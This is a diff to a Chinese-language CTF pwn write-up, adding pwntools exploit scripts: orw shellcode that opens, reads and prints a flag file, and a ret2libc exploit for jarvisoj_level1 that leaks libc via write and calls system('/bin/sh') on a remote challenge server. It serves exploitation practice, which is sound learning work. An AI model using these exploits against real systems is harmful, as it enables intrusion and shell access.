@@ -508,7 +508,7 @@ seccomp-tools dump ./orw
 
 seccomp-tools这个工具要求ruby2.4以上，然而ubuntu16.04自带的是2.3。有鉴于过往升级系统自带软件有可能存在的坑，所以就用了一个叫[rbenv](https://github.com/rbenv/rbenv)([rbenv-installer](https://github.com/rbenv/rbenv-installer))的工具管理ruby版本，只是这玩意儿安装起来速度慢的一批得加速一下。
 
-```
+```python
 #!/usr/bin/python3.6
 from pwn import *
 
@@ -527,7 +527,6 @@ payload = asm("""
     push 0x5
     pop eax             #syscall 0x5 for open 
     int 0x80            #invoke
-    
     mov ebx, eax        #arg1, fd
     mov ecx, esp        #arg2, buf
     sub esp, 0x30       #buf
@@ -536,17 +535,47 @@ payload = asm("""
     push 0x3
     pop eax             #syscall 0x3 for read
     int 0x80
-    
     xor ebx,ebx         
     mov bl,0x1          #arg1, STDOUT
     push 0x2a           
     pop edx             #arg3, bytes
     push 0x4
     pop eax             #syscall 0x3 for read
-    int 0x80
-""")
-
+    int 0x80""")
 payload += b'1'*(0xc8- len(payload))
+p.send(payload)
+p.interactive()
+```
+
+### jarvisoj_level1
+
+本地程序和远程题目的行为不一样。。。本地程序在vulnerable_function里面会输出缓冲区的地址，但是远程题目貌似把这个动作放到main函数里了，不清楚缓冲区的具体位置；只能猜测是vulnerable_function只剩下一个有栈溢出的read函数调用。
+
+```python
+#!/usr/bin/python3.6
+from pwn import *
+# from LibcSearcher import LibcSearcher
+
+executable = './level1'
+glibc = '/home/ubuntu/project/libc/buuoj-ubuntu-16-x86-libc-2.23.so'
+#p = process(executable)
+p = remote('node3.buuoj.cn', 29719)
+e = ELF(executable)
+libc = ELF(glibc)
+
+
+payload = b'\x90'*(0x88+4) + p32(e.plt["write"]) + p32(e.sym['main']) + p32(1) + p32(e.got["write"]) + p32(4)
+log.info(f'{len(payload)}')
+p.sendline(payload) 
+
+addr = u32(p.recv(4))
+base = addr - libc.sym['write']
+system = base + libc.sym['system']
+bin_sh = base + 0x0015902b 
+
+log.success(f'write={hex(addr)}, base={hex(base)}, system={hex(system)}, /bin/sh={hex(bin_sh)}')
+payload = b'\x90'*(0x88+4) + p32(system) + p32(e.sym["main"]) + p32(bin_sh)
+
 p.send(payload)
 p.interactive()
 ```
